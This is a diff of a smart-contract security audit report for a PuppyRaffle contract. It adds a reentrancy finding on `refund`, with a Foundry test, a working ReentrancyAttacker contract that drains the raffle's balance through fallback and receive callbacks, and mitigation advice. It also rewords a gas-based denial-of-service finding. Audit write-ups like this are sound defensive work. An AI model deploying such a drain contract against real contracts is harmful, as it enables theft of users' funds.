@@ -1,17 +1,96 @@
-### [H-1] Function enterRaffle does not make user pay for raffle tickets.
+### [H-1] Function `PuppyRaffle::refund` is vulnerable to reenteracy attacks.
 
-**Description:** The point of `PuppyRaffle::enterRaffle` is to have users pay for tickets in the transaction. But there is no call made to send value from user to the smart contract.
+**Description:** The function `PuppyRaffle::refund` sends an external call before updating the states. This external call can be called multiple times before it ever reaches the `players[playerIndex] = address(0)`.
 
-Below is one such example to read data off chain.
+**Impact:** Impact of reenteracy attacks can be critical. Attacker can drain the contract funds by calling back to `PuppyRaffle` contract once they receive funds using `fallback()` or `recive()`. Which calls back the `refund()` again before it ever gets a chance to update the balance, in this case removing them from `players[]`. They can drain the contract until there is nothing left.
 
-**Impact:** Function checks if ETH is being sent is greater than equal ticket price but does not actually send the transaction value, or confirms if it is being sent.
+**Proof of Concept:** Place the following test in `PuppyRaffle.t.sol`.
 
-**Proof of Concept:**
+<details>
+<summary> POC </summary>
 
-**Recommended Mitigation:**
-Severity: HIGH
+```javascript
 
-### [M-#] Function `PuppyRaffle::enterRaffle` is exposed to DOS(Denial of service attacks, looping through unchecked players array.
+
+    function test_reenterancyAttack() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReenterancyAttacker attackerContract = new ReenterancyAttacker(
+            puppyRaffle
+        );
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract)
+            .balance;
+        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        // executing attack
+        vm.prank(attacker);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("starting attacker balance", startingAttackContractBalance);
+        console.log("starting puppyRaffle balance", startingPuppyRaffleBalance);
+
+        console.log(
+            "ending attacker balance",
+            address(attackerContract).balance
+        );
+        console.log("ending puppyRaffle balance", address(puppyRaffle).balance);
+    }
+
+contract ReenterancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 enteranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        enteranceFee = _puppyRaffle.entranceFee();
+    }
+
+    //enter raffle
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: enteranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _steal() internal {
+        if (address(puppyRaffle).balance >= enteranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _steal();
+    }
+
+    receive() external payable {
+        _steal();
+    }
+}
+
+```
+
+</details>
+
+**Recommended Mitigation:** Reenterancy attack can be mitigated by following some best practices when dealing with external calls.
+
+- Make checks first
+- Update variables
+- Lastly external calls
+
+Another solution for this would be using Openzeppelins `ReentrancyGuard` contract, it provides a modifier to functions to prevent these attacks from happening.
+
+### [M-#] Function `PuppyRaffle::enterRaffle` is exposed to DOS(Denial of service) attacks, looping through unchecked players array.
 
 **Description:** Function `PuppyRaffle::enterRaffle` is prone to DOS attacks. It iterates unbouded through the list `players`, makes it more gas expensive over time could potentially end up being over block gas limit.Every single player added will require additional check to make on top of already existing players resulting directly in increasing gas cost.
 
